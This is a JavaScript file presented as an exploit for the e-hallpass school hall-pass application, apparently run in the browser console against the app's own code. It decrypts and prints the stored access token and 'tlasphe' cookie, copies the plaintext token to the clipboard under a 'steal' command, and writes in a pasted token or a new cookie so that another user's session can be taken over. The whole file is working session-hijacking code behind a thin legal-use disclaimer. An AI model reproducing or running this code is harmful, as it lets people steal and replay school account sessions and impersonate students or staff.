// blue linden
// 3/21/2023

// import authentication and cookie code from e-hallpass's source
import authService from "./helpers/authentication";
import cookieService from "./helpers/cookies";

window.alert("initalized. open the console to see information about the exploit. by doing so, you have confirmed that you are allowed to use this tool and that you gained access to it through legal means.");

console.info(`
  exploit developed by blue linden in 2023
  https://bluelinden.art/ 

  
  type "steal" to copy the unencrypted token to your clipboard
  type "paste" to paste a new token
  type "tlasphe" to change the tlasphe cookie to anything of your choice`);

// get the token
const token = authService.getToken();

// print various pieces of information about the state of the app
console.info("Token: " + token);
console.info("Encrypted token: " + localStorage.getItem("accessToken"));
console.info("Tlasphe cookie: " + cookieService.getCookie("tlasphe"));

// prompt the user for an action, by default "steal"
let exploitAction = window.prompt("Action?", "steal");

// switch statement to handle the action
switch (exploitAction) {
  case "steal": // get the token, log a buncha stuff, and copy it to the clipboard
    console.log("Stealing token");
    const token = authService.getToken();
    const type = "text/plain";
    const blob = new Blob([token], { type });
    const clipboardToken = [new ClipboardItem({ [type]: blob })];
    navigator.clipboard.write(clipboardToken);
    console.log("Token stolen + copied to clipboard");
    break;
  case "paste": // prompt the user with a text box to paste a new token, log a buncha stuff, and write the new token to local storage in encrypted form
    console.info("Old token: " + authService.getToken());
    console.info("Old encrypted token: " + localStorage.getItem("accessToken"));
    let newToken = window.prompt("New token?", "");
    console.info("Writing new token");
    authService.saveToken(newToken);
    console.info("New token: " + authService.getToken());
    console.info("New encrypted token: " + localStorage.getItem("accessToken"));
    break;
  case "tlasphe": // swap the tlasphe cookie out with a new one and re-encrypt, for demonstration purposes
    let oldToken = authService.getToken();
    console.info("Old encrypted token: " + localStorage.getItem("accessToken"));
    console.info("Old token: " + oldToken);
    let oldTlasphe = cookieService.getCookie("tlasphe");
    console.info("Old tlasphe: " + oldTlasphe);
    let newTlasphe = window.prompt("New tlasphe?", "");
    console.info("New tlasphe: " + newTlasphe);
    cookieService.setCookie("tlasphe", newTlasphe);
    authService.saveToken(oldToken);
    console.info("Writing new tlasphe cookie");
    cookieService.setCookie("tlasphe", newTlasphe);
    console.info("New encrypted token: " + localStorage.getItem("accessToken"));
}